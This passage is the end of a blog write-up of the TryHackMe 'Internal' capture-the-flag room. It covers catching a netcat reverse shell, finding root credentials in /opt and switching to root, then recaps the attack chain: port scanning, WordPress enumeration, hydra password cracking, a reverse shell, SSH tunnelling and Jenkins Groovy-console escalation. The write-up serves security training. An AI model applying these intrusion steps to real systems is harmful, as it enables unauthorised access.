</pre></table></code></div></div><p>Make sure to run <code class="language-plaintext highlighter-rouge">netcat</code> on your chosen port so that it can catch the callback:</p><p><img data-src="/assets/posts/20220122/23_netcat_callback.png" alt="netcat callback" data-proofer-ignore></p><p>We are now logged in as the <code class="language-plaintext highlighter-rouge">jenkins</code> user, but we need to be <code class="language-plaintext highlighter-rouge">root</code>. So, we need to do more enumeration. We found credentials in the <code class="language-plaintext highlighter-rouge">/opt</code> directory last time, so let’s start there. It turns out that there is a <code class="language-plaintext highlighter-rouge">note.txt</code> file within this folder containing credentials for the <code class="language-plaintext highlighter-rouge">root</code> user:</p><p><img data-src="/assets/posts/20220122/24_root_creds.png" alt="root creds" data-proofer-ignore></p><p>Now, we can use <code class="language-plaintext highlighter-rouge">su</code> to switch user over to <code class="language-plaintext highlighter-rouge">root</code> and retrieve the <code class="language-plaintext highlighter-rouge">root.txt</code> flag:</p><p><img data-src="/assets/posts/20220122/25_root_flag.png" alt="root flag" data-proofer-ignore></p><p>And that’s it! All done!</p><h2 id="summary-and-feedback"><span class="mr-2">Summary and Feedback</span><a href="#summary-and-feedback" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this room we:</p><ul><li>Scanned ports using <code class="language-plaintext highlighter-rouge">nmap</code><li>Enumerated Wordpress with <code class="language-plaintext highlighter-rouge">wpscan</code><li>Used <code class="language-plaintext highlighter-rouge">gobuster</code> to enumerate directories<li>Used <code class="language-plaintext highlighter-rouge">hydra</code> to crack passwords<li>Exploited Wordpress to gain a reverse shell<li>Used SSH tunnelling to open up an internal Jenkins server<li>Escalated our privileges Jenkins using the Groovy Script console</ul><p>As you can see, this was a very complex room which incorporates a lot of different technologies. If you are a beginner, one thing I would like you to take away from this is that enumeration is key. Enumerate everything as much as you possibly can so that you have a better idea of what to do.</p><p>Another thing to keep in mind is that the obvious path sometimes isn’t the correct one. In this case, we found obvious credentials for multiple users like <code class="language-plaintext highlighter-rouge">william</code> and the <code class="language-plaintext highlighter-rouge">phpmyadmin</code> but they didn’t lead anywhere. If this happens, it is vital that you take a step back and reassess the information you have got up to this point, and then see what other routes you can go down.</p><p>I hope you enjoyed this writeup.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/accessible/" class="post-tag no-text-decoration" >accessible</a> <a href="/tags/pentest/" class="post-tag no-text-decoration" >pentest</a> <a href="/tags/misconfiguration/" class="post-tag no-text-decoration" >misconfiguration</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Internal+Writeup+%7C+TryHackMe+-+v3r4x&url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Finternal-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Internal+Writeup+%7C+TryHackMe+-+v3r4x&u=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Finternal-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Finternal-writeup-tryhackme%2F&text=Internal+Writeup+%7C+TryHackMe+-+v3r4x" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/brooklyn-nine-nine-writeup-tryhackme/">Brooklyn Nine Nine Writeup | TryHackMe</a><li><a href="/posts/ejpt-cheatsheet/">eJPT Cheatsheet</a><li><a href="/posts/internal-writeup-tryhackme/">Internal Writeup | TryHackMe</a><li><a href="/posts/alfred-writeup-tryhackme/">Alfred Writeup | TryHackMe</a><li><a href="/posts/hackpark-writeup-tryhackme/">HackPark Writeup | TryHackMe</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/relevant-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1643068800" data-df="ll" > Jan 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Relevant Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the Relevant room on TryHackMe. This as incredibly well-designed room which really tests your enumeration abilities. It is an unfortunate reality that the most ob...</p></div></div></a></div><div class="card"> <a href="/posts/the-great-escape-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1643414400" data-df="ll" > Jan 29, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The Great Escape Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the “The Great Escape” CTF. This challenge was a lot of fun, but very difficult (as you will see). I would recommend this if you have completed other docker-relat...</p></div></div></a></div><div class="card"> <a href="/posts/basic-pentesting-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1642118400" data-df="ll" > Jan 14, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Basic Pentesting Writeup | TryHackMe</h3><div class="text-muted small"><p> CTF Overview Welcome to the writeup for the Basic Pentesting CTF. In this box, you will learn how to do the following: Service enumeration Brute forcing Hash cracking Linux enumeration ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ignite-writeup-tryhackme/" class="btn btn-outline-primary" prompt="Older"><p>Ignite Writeup | TryHackMe</p></a> <a href="/posts/overpass-2-hacked-writeup-tryhackme/" class="btn btn-outline-primary" prompt="Newer"><p>Overpass 2 - Hacked Writeup | TryHackMe</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/0xv3r4x">v3r4x</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
